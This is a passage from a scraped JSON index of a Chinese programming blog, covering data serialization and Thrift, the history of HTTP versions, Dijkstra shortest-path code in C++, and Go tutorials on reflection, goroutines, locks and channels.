Thrift软件框架用于可伸缩的跨语言服务开发，它将软件栈和代码生成引擎结合在一起，以构建在C++、Java、Python、PHP、Ruby、Erlang、Perl、Haskell、C#、Cocoa、JavaScript、Node.js、Smalltalk、OCaml和Delphi等语言之间高效、无缝地工作的服务。\nThrift 采用IDL（Interface Definition Language）来定义通用的服务接口，然后通过Thrift提供的编译器，可以将服务接口编译成不同语言编写的代码，通过这个方式来实现跨语言的功能。\n 通过命令调用Thrift提供的编译器将服务接口编译成不同语言编写的代码。 这些代码又分为服务端和客户端，将所在不同进程(或服务器)的功能连接起来。  实例\n","permalink":"https://kevinerr.github.io/posts/tech/%E6%95%B0%E6%8D%AE%E4%BA%A4%E6%8D%A2%E6%A0%BC%E5%BC%8F/","summary":"序列化与反序列化 将不同语言的特有数据结构搞成大家都认的二进制串 将大家都认的二进制串子搞成不同语言的特有数据结构 如果在一大坨微服务构成的庞大业","title":"数据交换格式"},{"content":"host字段的作用. 同一个IP可以设置多个不同站点， 如果访问不同的域名都转发到同一IP，怎么区分这些不同的站点呢 ， 就是用的Host字段 ，如果服务器后台解析出Host但是服务器上找不到相应的站点，那么这个连接很可能会被丢弃，从而报错。. 虚拟主机的原理是通过HTTP请求头中的Host是否匹配server_name来实现的。\nHTTP 1.0   短连接：每次发送请求都要重新建立tcp请求，即三次握手，非常浪费性能\n  无host头域，也就是http请求头里的host，\n  不允许断点续传，而且不能只传输对象的一部分，要求传输整个对象\n  队头阻塞（head of line blocking）\n由于HTTP1.0规定下一个请求必须在前一个请求响应到达之前才能发送，假设前一个请求响应一直不到达，那么下一个请求就不发送，后面的请求就阻塞了。\n  HTTP 1.1  长连接，流水线，使用connection:keep-alive使用长连接 请求管道化 ，尴尬的假并行传输：服务器必须按照客户端请求的先后顺序依次回送相应的结果，以保证客户端能够区分出每次请求的响应内容。 增加缓存处理（新的字段如cache-control） 增加Host字段，支持断点传输等 由于长连接会给服务器造成压力 a. 对域名进行分片，使得客户端可以创建更多的 TCP 连接提高请求并发度 b. 设置 Connection: Keep-Alive Header 保持长连接，减少 TCP 连接握手的开销 d. 将小的静态资源直接嵌入到页面中，减少 HTTP 请求次数  HTTP 2.0  二进制分帧 头部压缩，双方各自维护一个header的索引表，使得不需要直接发送值，通过发送key缩减头部大小 多路复用（或连接共享），使用多个stream，每个stream又分帧传输，使得一个tcp连接能够处理多个http请求 服务器推送（Sever push）：利用 ServerPush 将页面上的关键静态资源直接推送到客户端，无需等待客户端请求  HTTP 3.0  基于google的QUIC协议，而quic协议是使用udp实现的 减少了tcp三次握手时间，以及tls握手时间 解决了http 2.0中前一个stream丢包导致后一个stream被阻塞的问题 优化了重传策略，重传包和原包的编号不同，降低后续重传计算的消耗 连接迁移，不再用tcp四元组确定一个连接，而是用一个64位随机数来确定这个连接 更合适的流量控制   基于UDP实现 0RTT建连 基于UDP的多路复用 加密认证的报文 向前纠错机制\n ","permalink":"https://kevinerr.github.io/posts/tech/http/","summary":"host字段的作用. 同一个IP可以设置多个不同站点， 如果访问不同的域名都转发到同一IP，怎么区分这些不同的站点呢 ， 就是用的Host字段 ，如果","title":"HTTP"},{"content":"朴素dijkstra算法 Dijkstra 算法是一个基于「贪心」、「广度优先搜索」、「动态规划」求一个图中一个点到其他所有点的最短路径的算法，时间复杂度 O(n2) 每次从 「未求出最短路径的点」中 取出 距离距离起点 最小路径的点，以这个点为桥梁 刷新「未求出最短路径的点」的距离\n时间复杂是 O(n^2+m)O(n^2+m), n表示点数，m表示边数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  int g[N][N]; // 存储每条边 int dist[N]; // 存储1号点到每个点的最短距离 bool st[N]; // 存储每个点的最短路是否已经确定  // 求1号点到n号点的最短路，如果不存在则返回-1 int dijkstra() {  memset(dist, 0x3f, sizeof dist);  dist[1] = 0;   for (int i = 0; i \u0026lt; n - 1; i ++ )  {  int t = -1; // 在还未确定最短路的点中，寻找距离最小的点  for (int j = 1; j \u0026lt;= n; j ++ )  if (!st[j] \u0026amp;\u0026amp; (t == -1 || dist[t] \u0026gt; dist[j]))  t = j;   // 用t更新其他点的距离  for (int j = 1; j \u0026lt;= n; j ++ )  dist[j] = min(dist[j], dist[t] + g[t][j]);   st[t] = true;  }   if (dist[n] == 0x3f3f3f3f) return -1;  return dist[n]; }   堆优化版dijkstra 时间复杂度 O(mlogn)O(mlogn), n表示点数，m 表示边数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  typedef pair\u0026lt;int, int\u0026gt; PII;  int n; // 点的数量 int h[N], w[N], e[N], ne[N], idx; // 邻接表存储所有边 int dist[N]; // 存储所有点到1号点的距离 bool st[N]; // 存储每个点的最短距离是否已确定  // 求1号点到n号点的最短距离，如果不存在，则返回-1 int dijkstra() {  memset(dist, 0x3f, sizeof dist);  dist[1] = 0;  priority_queue\u0026lt;PII, vector\u0026lt;PII\u0026gt;, greater\u0026lt;PII\u0026gt;\u0026gt; heap;  heap.push({0, 1}); // first存储距离，second存储节点编号   while (heap.size())  {  auto t = heap.top();  heap.pop();   int ver = t.second, distance = t.first;   if (st[ver]) continue;  st[ver] = true;   for (int i = h[ver]; i != -1; i = ne[i])  {  int j = e[i];  if (dist[j] \u0026gt; distance + w[i])  {  dist[j] = distance + w[i];  heap.push({dist[j], j});  }  }  }   if (dist[n] == 0x3f3f3f3f) return -1;  return dist[n]; }   ","permalink":"https://kevinerr.github.io/posts/algorithm/%E6%9C%80%E7%9F%AD%E8%B7%AF/","summary":"朴素dijkstra算法 Dijkstra 算法是一个基于「贪心」、「广度优先搜索」、「动态规划」求一个图中一个点到其他所有点的最短路径的算法，时间复杂度 O(n2) 每","title":"最短路"},{"content":"封装 封装主要是通过访问权限控制实现的。 在Java中，共有public 、protected、default、private这四种权限控制。 而相应的在golang中，是通过约定来实现权限控制的。变量名首字母大写，相当于java中的public，首字母小写，相当于private。同一个包中访问，相当于default。由于go没有继承，也就没有protected。\n继承 虽然golang的语法没有继承，但是可以通过相应的结构体之间的组合来实现类似的继承效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  package main  import \u0026#34;fmt\u0026#34;  type Person struct{ \tName string } func (p *Person) Say(){ \tfmt.Println(\u0026#34;Person name is :\u0026#34;,p.Name) } type Boy struct{ \tHaveFuJi bool \tPerson } func (b *Boy) Say(){ \tfmt.Println(\u0026#34;Boy name is :\u0026#34;,b.Name) }  func main(){ \tboy := \u0026amp;Boy{ \tHaveFuJi:true, \t} \tboy.Name=\u0026#34;hkh\u0026#34; \tboy.Say() }  //输出结果 Boy name is : hkh   多态 Java 中的多态是通过 extends class 或者 implements interface 实现的，在 golang 中既没有 extends，也没有 implements ，那么 go 中多态是如何实现的呢 ？\n答案：在golang中，只要某个struct实现了某个interface中的所有方法，那么我们就认为，这个struct实现了这个类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  package main  import \u0026#34;fmt\u0026#34;  type Person interface {  Action() }  type Girl struct {  Name string }  func (g *Girl) Action() {  fmt.Printf(\u0026#34;My name is %v\\n\u0026#34;, g.Name) }  type Boy struct {  Name string }  func (b *Boy) Action() {  fmt.Printf(\u0026#34;My name is %v\\n\u0026#34;, b.Name) }  func main() {  girl := \u0026amp;Girl{Name: \u0026#34;Beautiful\u0026#34;}  boy := \u0026amp;Boy{Name: \u0026#34;Handsome\u0026#34;}  girl.Action()  boy.Action() } //输出结果 My name is Beautiful My name is Handsome   反射 Go 语言中的反射与其他语言有比较大的不同，Golang 中的发射主要涉及到两个基本概念 Type 和 Value，它们也是 Go 语言包中 reflect 包里最重要的两个类型。\nTypeOf、ValueOf 使用反射获取变量基本类型的语法：\n1  reflect.TypeOf(varname)   使用反射获取变量值的基本语法：\n1  reflect.ValueOf(varname)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; )  type Person struct { \tName string \tAge int }  func main() { \tvar x = 3.4 \tvar str = \u0026#34;HaiCoder\u0026#34; \tperson := \u0026amp;Person{ \tName: \u0026#34;HaiCoder\u0026#34;, \tAge: 18, \t} \tfmt.Println(\u0026#34;x type =\u0026#34;, reflect.TypeOf(x)) \tfmt.Println(\u0026#34;str type =\u0026#34;, reflect.TypeOf(str)) \tfmt.Println(\u0026#34;person type =\u0026#34;, reflect.TypeOf(person))  fmt.Println(\u0026#34;x value =\u0026#34;, reflect.ValueOf(x)) \tfmt.Println(\u0026#34;str value =\u0026#34;, reflect.ValueOf(str)) \tfmt.Println(\u0026#34;person value =\u0026#34;, reflect.ValueOf(person)) }   1 2 3 4 5 6  x type = float64 str type = string person type = *main.Person x value = 3.4 str value = HaiCoder person value = \u0026amp;{HaiCoder 18}   Kind 反射获取变量类型的详细信息语法：\n1  reflect.TypeOf(varname).Kind()   类型详细信息和基本数据类型比较的语法：\n1  v.Kind() == reflect.Float64   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; )  func main() { \tvar x = 1024 \tvar str = \u0026#34;HaiCoder\u0026#34; \ttypeX := reflect.TypeOf(x) \ttypeStr := reflect.TypeOf(str) \ttypexKind := typeX.Kind() \ttypeStrKind := typeStr.Kind() \tfmt.Println(\u0026#34;x type =\u0026#34;, typeX, \u0026#34;, Kind =\u0026#34;, typexKind) \tfmt.Println(\u0026#34;str type =\u0026#34;, typeStr, \u0026#34;, Kind =\u0026#34;, typeStrKind) \tif typexKind == reflect.Int { \tfmt.Println(\u0026#34;typexKind is int\u0026#34;) \t} else { \tfmt.Println(\u0026#34;typexKind is not int\u0026#34;) \t} \tif typeStrKind == reflect.String { \tfmt.Println(\u0026#34;typeStrKind is string\u0026#34;) \t} else { \tfmt.Println(\u0026#34;typeStrKind is not string\u0026#34;) \t} }   1 2 3 4  x type = int , Kind = int str type = string , Kind = string typexKind is int typeStrKind is string   Elem 使用 reflect.ValueOf 的 Elem() 方法传入我们要获取的变量，可以获取该变量的指针所指向的对象的信息。如果 ValueOf 传入的是值类型，那么使用 Elem 获取地址会 panic。\n因此，使用 Elem() 获取地址的前提是，我们传入的 varname 是一个地址，而不是一个值类型。\n1  reflect.ValueOf(varname).Elem()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; )  func main() { \tvar x = 1024 \tvar str = \u0026#34;HaiCoder\u0026#34; \tpValueX := reflect.ValueOf(\u0026amp;x) \tpValueStr := reflect.ValueOf(\u0026amp;str) \tfmt.Println(\u0026#34;pvalueX =\u0026#34;, pValueX) \tfmt.Println(\u0026#34;pvalueStr =\u0026#34;, pValueStr) \tpValueElemX := pValueX.Elem() \tpValueElemStr := pValueStr.Elem() \tfmt.Println(\u0026#34;pValueElemX =\u0026#34;, pValueElemX) \tfmt.Println(\u0026#34;pValueElemStr =\u0026#34;, pValueElemStr) \tvalueX := reflect.ValueOf(x) \tvalueStr := reflect.ValueOf(str) \tfmt.Println(\u0026#34;valueX =\u0026#34;, valueX) \tfmt.Println(\u0026#34;valueStr =\u0026#34;, valueStr) \tvalueElemX := valueX.Elem() \tvalueElemStr := valueStr.Elem() \tfmt.Println(\u0026#34;valueElemX =\u0026#34;, valueElemX) \tfmt.Println(\u0026#34;valueElemStr =\u0026#34;, valueElemStr) }   1 2 3 4 5 6 7  pvalueX = 0xc000018088 pvalueStr = 0xc000040250 pValueElemX = 1024 pValueElemStr = HaiCoder valueX = 1024 valueStr = HaiCoder panic: reflect: call of reflect.Value.Elem on int Value   CanSet() CanSet要和Elem配合使用，并且reflect.ValueOf 要传入变量的地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; )  func main() { \tvar x = 1024 \tvar intSlice = []uint64{256, 512, 1024} \tpValueX := reflect.ValueOf(\u0026amp;x) \tpValueStr := reflect.ValueOf(\u0026amp;intSlice) \tfmt.Println(\u0026#34;pValueX can set =\u0026#34;, pValueX.CanSet()) \tfmt.Println(\u0026#34;pValueStr can set =\u0026#34;, pValueStr.CanSet()) \tvalueElemInt := reflect.ValueOf(\u0026amp;x).Elem() \tvalueElemSlice := reflect.ValueOf(\u0026amp;intSlice).Elem() \tfmt.Println(\u0026#34;valueElemInt can set =\u0026#34;, valueElemInt.CanSet()) \tfmt.Println(\u0026#34;valueElemSlice can set =\u0026#34;, valueElemSlice.CanSet()) }   1 2 3 4  pValueX can set = false pValueStr can set = false valueElemInt can set = true valueElemSlice can set = true   Set、SetXXX 通过反射修改变量的值，有两种方法，一种是使用 Set 方法，一种是使用 SetXXX() 方法，比如 SetString()、SetInt() 等。Go 语言反射修改变量语法：\n1  reflect.ValueOf(\u0026amp;x).Elem().Set()   Go 语言反射修改变量语法：\n1  reflect.ValueOf(\u0026amp;x).Elem().SetXXX()   1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; )  func main() { \tvar x = 1024 \tvar str = \u0026#34;HaiCoder\u0026#34; \txValue := reflect.ValueOf(\u0026amp;x).Elem() \tstrValue := reflect.ValueOf(\u0026amp;str).Elem() \tif xValue.CanSet() { \txValue.SetInt(10240) \tfmt.Println(\u0026#34;New xValue =\u0026#34;, xValue) \t} \tif strValue.CanSet() { \tstrValue.SetString(\u0026#34;kaicoder\u0026#34;) \tfmt.Println(\u0026#34;New strValue =\u0026#34;, strValue) \t}  \tnewXValue := reflect.ValueOf(20140) \tnewStrValue := reflect.ValueOf(\u0026#34;hkhcoder\u0026#34;) \tif xValue.CanSet() { \txValue.Set(newXValue) \tfmt.Println(\u0026#34;New xValue =\u0026#34;, xValue) \t} \tif strValue.CanSet() { \tstrValue.Set(newStrValue) \tfmt.Println(\u0026#34;New strValue =\u0026#34;, strValue) \t} }   1 2 3 4  New xValue = 10240 New strValue = kaicoder New xValue = 20140 New strValue = hkhcoder   Index Go 语言反射修改整个切片语法：\n1 2 3  intSliceElemValue := reflect.ValueOf(\u0026amp;intSlice).Elem() newVale := reflect.ValueOf(newSliceValue) intSliceElemValue.Set(newVale)   Go 语言反射修改切片索引处的值语法：\n1 2 3  intSliceValue := reflect.ValueOf(intSlice) e := intSliceValue.Index(0) e.SetInt(2560)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; )  func main() { \tvar intSlice = []int{256, 512, 1024} \tintSliceElemValue := reflect.ValueOf(\u0026amp;intSlice).Elem() \tif intSliceElemValue.CanSet() { \tnewSliceValue := []int{2560, 5120, 10240} \tnewVale := reflect.ValueOf(newSliceValue) \tintSliceElemValue.Set(newVale) \tfmt.Println(\u0026#34;NewSliceVal =\u0026#34;, intSlice) \t} \tintSliceValue := reflect.ValueOf(intSlice) \te := intSliceValue.Index(0) \tif e.CanSet() { \te.SetInt(2570) \tfmt.Println(\u0026#34;NewVal =\u0026#34;, intSliceValue) \t} }   1 2  NewSliceVal = [2560 5120 10240] NewVal = [2570 5120 10240]   Name、Type、Tag 在 Golang 中，通过反射的 reflect.TypeOf() 获得反射的对象信息后，如果是结构体类型，可以通过反射值对象（reflect.Type）的 NumField() 和 Field() 方法获得结构体成员的详细信息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; )  type Person struct { \tName string `json:name` \tAge int `json:age` }  func main() { \tperson := Person{ \tName: \u0026#34;HaiCoder\u0026#34;, \tAge: 109, \t} \tpersonType := reflect.TypeOf(person) \tfor i := 0; i \u0026lt; personType.NumField(); i++ { \t// 获取每个成员的结构体字段类型 \tfieldType := personType.Field(i) \tfmt.Println(\u0026#34;FiledName =\u0026#34;, fieldType.Name, \u0026#34;Type =\u0026#34;, fieldType.Type, \u0026#34;Tag =\u0026#34;, fieldType.Tag) \t} \tfiledName, isOk := personType.FieldByName(\u0026#34;Name\u0026#34;) \tif isOk { \tfmt.Println(\u0026#34;FiledName =\u0026#34;, filedName.Name, \u0026#34;Type =\u0026#34;, filedName.Type, \u0026#34;Tag =\u0026#34;, filedName.Tag) \t} else { \tfmt.Println(\u0026#34;Filed Name not exist\u0026#34;) \t} }   1 2 3  FiledName = Name Type = string Tag = json:name FiledName = Age Type = int Tag = json:age FiledName = Name Type = string Tag = json:name   Tag.Get 在 Golang 中，通过反射除了可以解析结构体的字段信息，还可以解析结构体字段的 Tag 的具体信息，我们可以根据 Tag 名，获取 Tag 的具体描述。Go 语言解析结构体 Tag 语法：\n1 2 3  personType := reflect.TypeOf(person) fieldName, isOk := personType.FieldByName(\u0026#34;Name\u0026#34;) jsobTagVal := fieldName.Tag.Get(\u0026#34;json\u0026#34;)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  package main import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; ) type Person struct { \tName string `json:\u0026#34;name\u0026#34; bson:\u0026#34;Name\u0026#34;` \tAge int `json:\u0026#34;age\u0026#34; bson:\u0026#34;Age\u0026#34;` } func main() { \tperson := Person{ \tName:\u0026#34;HaiCoder\u0026#34;, \tAge:109, \t} \tpersonType := reflect.TypeOf(person) \tfieldName, isOk := personType.FieldByName(\u0026#34;Name\u0026#34;) \tif isOk{ \tjsonTag := fieldName.Tag.Get(\u0026#34;json\u0026#34;) \tbsonTag := fieldName.Tag.Get(\u0026#34;bson\u0026#34;) \tfmt.Println(\u0026#34;Name Json Tag =\u0026#34;, jsonTag, \u0026#34;Bson Tag =\u0026#34;, bsonTag) \t}else{ \tfmt.Println(\u0026#34;No Name Field\u0026#34;) \t} \tfieldAge, isOk := personType.FieldByName(\u0026#34;Age\u0026#34;) \tif isOk{ \tjsonTag := fieldAge.Tag.Get(\u0026#34;json\u0026#34;) \tbsonTag := fieldAge.Tag.Get(\u0026#34;bson\u0026#34;) \tfmt.Println(\u0026#34;Name Json Tag =\u0026#34;, jsonTag, \u0026#34;Bson Tag =\u0026#34;, bsonTag) \t}else{ \tfmt.Println(\u0026#34;No Age Field\u0026#34;) \t} }   1 2  Name Json Tag = name Bson Tag = Name Name Json Tag = age Bson Tag = Age   FieldByName(\u0026ldquo;Name\u0026rdquo;).String() 在 Golang 中，通过反射的 reflect.ValueOf() 获得反射的对象信息后，如果是结构体类型，可以通过反射值对象（reflect.Value）的详细信息来获取结构体字段的值。Go 语言反射解析结构体字段值语法：\n1 2  personValue := reflect.ValueOf(person) nameValue := personValue.FieldByName(\u0026#34;Name\u0026#34;).String()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  package main import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; ) type Person struct { \tName string `json:name` \tAge int `json:age` } func main() { \tperson := Person{ \tName:\u0026#34;HaiCoder\u0026#34;, \tAge:109, \t} \tpersonValue := reflect.ValueOf(person) \tnameValue := personValue.FieldByName(\u0026#34;Name\u0026#34;).String() \tageValue := personValue.FieldByName(\u0026#34;Age\u0026#34;).Int() \tfmt.Println(\u0026#34;Name Value =\u0026#34;, nameValue, \u0026#34;Age Value =\u0026#34;, ageValue) }   1  Name Value = HaiCoder Age Value = 109   SetString 在 Golang 中，通过反射的 reflect.ValueOf() 获得反射的对象信息后，如果是结构体类型，可以通过反射的 Elem() 来修改字段值。Go 语言反射解析结构体字段值语法：\n1 2  personNameValue := reflect.ValueOf(\u0026amp;person.Name) personNameValue.Elem().SetString(\u0026#34;haicoder\u0026#34;)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;reflect\u0026#34; )  type Person struct { \tName string `json:name` \tAge int `json:age` }  func main() { \tperson := Person{ \tName: \u0026#34;HaiCoder\u0026#34;, \tAge: 109, \t} \tpersonNameValue := reflect.ValueOf(\u0026amp;person.Name) \tpersonAgeValue := reflect.ValueOf(\u0026amp;person.Age) \tpersonNameValue.Elem().SetString(\u0026#34;haicoder\u0026#34;) \tpersonAgeValue.Elem().SetInt(100) \tfmt.Println(\u0026#34;Name Value =\u0026#34;, person.Name, \u0026#34;Age Value =\u0026#34;, person.Age) }   Call 在 Golang 中，通过反射的 reflect.ValueOf() 获得结构体实例信息后，可以通过反射实例的 MethodByName 获取相应的方法，然后调用 Call 调用方法。\n通过反射的 MethodByName 获取的方法只能获取导出的方法，也就是首字母大写的方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  package main import (  \u0026#34;fmt\u0026#34;  \u0026#34;reflect\u0026#34; ) type Student struct {  Name string  Age int  Score float64 } // 定义一个结构体，并为结构体添加带参数和返回值的方法 func (s Student)IsPass(score float64)(isPass bool){  if s.Score \u0026gt;= score{  return true  }  return false } func main() {  var p = Student{  Name:\u0026#34;HaiCoder\u0026#34;,  Age:10,  Score:99,  }  personValue := reflect.ValueOf(p)  IsPassFunc := personValue.MethodByName(\u0026#34;IsPass\u0026#34;)  args := []reflect.Value{reflect.ValueOf(100.0)}  res := IsPassFunc.Call(args)  fmt.Println(\u0026#34;Pass =\u0026#34;, res[0].Bool())  args = []reflect.Value{reflect.ValueOf(60.0)}  res = IsPassFunc.Call(args)  fmt.Println(\u0026#34;Pass =\u0026#34;, res[0].Bool()) }   1 2  Pass = false Pass = true   nil  在 Golang 中，通过反射的 reflect.ValueOf() 获得反射的对象信息后，该反射对象提供了一系列方法来进行零值和空值的判定。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  package main import (  \u0026#34;fmt\u0026#34;  \u0026#34;reflect\u0026#34; ) func main() {  // *int的空指针  var a *int  fmt.Println(\u0026#34;var a *int:\u0026#34;, reflect.ValueOf(a).IsNil())  // nil值  fmt.Println(\u0026#34;nil:\u0026#34;, reflect.ValueOf(nil).IsValid())  // *int类型的空指针  fmt.Println(\u0026#34;(*int)(nil):\u0026#34;, reflect.ValueOf((*int)(nil)).Elem().IsValid())  // 实例化一个结构体  s := struct{}{}  // 尝试从结构体中查找一个不存在的字段  fmt.Println(\u0026#34;不存在的结构体成员:\u0026#34;, reflect.ValueOf(s).FieldByName(\u0026#34;\u0026#34;).IsValid())  // 尝试从结构体中查找一个不存在的方法  fmt.Println(\u0026#34;不存在的结构体方法:\u0026#34;, reflect.ValueOf(s).MethodByName(\u0026#34;\u0026#34;).IsValid())  // 实例化一个map  m := map[int]int{}  // 尝试从map中查找一个不存在的键  fmt.Println(\u0026#34;不存在的键：\u0026#34;, reflect.ValueOf(m).MapIndex(reflect.ValueOf(3)).IsValid()) }   1 2 3 4 5 6  var a *int: true nil: false (*int)(nil): false 不存在的结构体成员: false 不存在的结构体方法: false 不存在的键： false   并发编程 go func 在 Go 程序中使用 go 关键字为一个函数创建一个 goroutine。在 golang 中，创建 goroutine 有两种方法，分别为：使用普通函数创建和使用匿名函数创建。普通函数创建 goroutine 语法：\n1  go funcName(paramlist)   匿名函数创建 goroutine 语法：\n1 2 3  go func( paramlist ){  //do something }( paramlist2 )   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;time\u0026#34; )  func printInfo(s string) { \tfor { \tfmt.Println(\u0026#34;Info =\u0026#34;, s) \t// 延时1秒 \ttime.Sleep(time.Second) \t} } func main() { \t// 使用匿名函数，加上 go 关键字，创建 goroutine \tgo func(s string) { \tfor { \tfmt.Println(\u0026#34;Info =\u0026#34;, s) \t// 延时1秒 \ttime.Sleep(time.Second) \t} \t}(\u0026#34;嗨客网 Golang\u0026#34;) \t// 使用普通函数创建 goroutine \tgo printInfo(\u0026#34;HaiCoder Golang\u0026#34;) \ttime.Sleep(time.Duration(3) * time.Second)  }   1 2 3 4 5 6  Info = HaiCoder Golang Info = 嗨客网 Golang Info = 嗨客网 Golang Info = HaiCoder Golang Info = HaiCoder Golang Info = 嗨客网 Golang   sync.WaitGroup Go 语言中要等待 goroutine 的结束，可以使用 sync.WaitGroup 相关的操作，首先，使用 wg.Add 方法增加需要等到的协程的数量，然后没执行完一个协程，使用 wg.Done 表明协程结束，最后使用 wg.Wait 等到所有的协程结束。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;sync\u0026#34; )  var ( \twg sync.WaitGroup )  func sum(num int) int { \tdefer wg.Done() \tresult := 0 \tfor i := 1; i \u0026lt;= num; i++ { \tresult += i \t} \tfmt.Println(\u0026#34;Sum =\u0026#34;, result) \treturn result } func mul(num int) int { \tdefer wg.Done() \tresult := 1 \tfor i := 1; i \u0026lt;= num; i++ { \tresult *= i \t} \tfmt.Println(\u0026#34;Mul =\u0026#34;, result) \treturn result } func main() { \twg.Add(2) \t// 使用 sync.WaitGroup 等待多个协程结束 \tgo sum(100) \tgo mul(10) \twg.Wait() }   1 2  Mul = 3628800 Sum = 5050   sync.Mutex 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  package main import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;sync\u0026#34; ) var( \t// 计数器 \tcount int \t// count 变量的互斥锁 \tcountMux sync.Mutex ) // 返回当前计数器的值 func Count()int{ \tcountMux.Lock() \tdefer countMux.Unlock() \treturn count } // 对计数器的值加一 func IncCount(){ \tcountMux.Lock() \tdefer countMux.Unlock() \tcount++ } func main() { \tIncCount() \tcount := Count() \tfmt.Println(\u0026#34;Count =\u0026#34;, count) }   sync.RWMutex 读写锁的使用必须保证 Lock 和 Unlock 成对出现，或者是 RLock 和 RUnlock 成对出现，在我们需要写数据时，需要使用成对的 Lock 和 Unlock，在我们需要读数据时，需要使用成对的 RLock 和 RUnlock。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;sync\u0026#34; )  var ( \t// 计数器 \tcount int \t// count 变量的读写互斥锁 \tcountMux sync.RWMutex )  // 返回当前计数器的值 func Count() int { \tcountMux.RLock() \tdefer countMux.RUnlock() \treturn count }  // 对计数器的值加一 func IncCount() { \tcountMux.Lock() \tdefer countMux.Unlock() \tcount++ } func main() { \t// 使用 sync.RWMutex 读写锁加锁操作 \tIncCount() \tcount := Count() \tfmt.Println(\u0026#34;Count =\u0026#34;, count) }   chan chan 是 Go 语言中的一个核心类型，可以把它看成一个管道，通过它并发核心单元就可以发送或者接收数据进行通讯。\nchan 的本质是一个队列，且 chan 是线程安全的, 也就是自带锁的功能。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;time\u0026#34; )  type Person struct { \tName string \tAge int }  func main() { \tperson := Person{ \tName: \u0026#34;HaiCoder\u0026#34;, \tAge: 18, \t} \t// 使用 Go 语言的 chan 发送一个结构体类型的数据 \tchanStruct := make(chan Person) \tgo func() { \tchanStruct \u0026lt;- person \ttime.Sleep(time.Duration(1) * time.Second) \t}() \t//接受数据 \tmsg := \u0026lt;-chanStruct \tfmt.Println(\u0026#34;chan Msg =\u0026#34;, msg) }   Go 语言中的 chan 也是一种系统资源，因此，我们不需要使用 chan 时，需要手动关闭管道。关闭管道，需要使用系统内置的 close 函数。\n如果，我们向一个已经关闭的管道发送数据，那么程序会 pannic。Go 语言 chan 关闭语法：\n1  close(msg_chan)   单向chan Golang 中的 channel 默认是双向的，也就是既可以读也可以写，同时，我们还可以创建单向的 channel。单向 channel 也就是只能用于发送数据或者只能用于接收数据的 channel。Go 语言创建双向 channel 语法;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  package main import ( \t\u0026#34;fmt\u0026#34; ) // 接受一个只写 channel 作为参数 func producer(send chan\u0026lt;- int) { \tfor i := 0; i \u0026lt; 3; i++ { \tsend \u0026lt;- i \t} \t// 使用 close 关闭 channel \tclose(send) } // 接受一个只读 channel 作为参数 func consumer(receive \u0026lt;-chan int) { \tfor num := range receive { \tfmt.Println(\u0026#34;receive num =\u0026#34;, num) \t} } func main() { \t// 创建一个双向channel \tchannel := make(chan int) \tgo producer(channel) \tconsumer(channel) }   无缓冲chan 无缓冲的通道是指在接收前没有能力保存任何值的通道。这种类型的通道要求发送 goroutine 和接收 goroutine 同时准备好，才能完成发送和接收操作。\n如果两个 goroutine 没有同时准备好，通道会导致先执行发送或接收操作的 goroutine 阻塞等待。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  package main import ( \t\u0026#34;fmt\u0026#34; 